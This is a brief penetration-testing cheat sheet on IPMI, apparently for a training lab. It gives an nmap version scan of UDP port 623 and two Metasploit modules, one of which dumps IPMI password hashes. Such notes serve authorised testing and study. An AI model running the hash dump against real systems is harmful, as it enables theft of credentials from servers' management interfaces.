---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# IPMI

**Nmap**

```
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

**Metasploit Version Scan**

```
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
```

**Metasploit Dumping Hashes**

```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
```
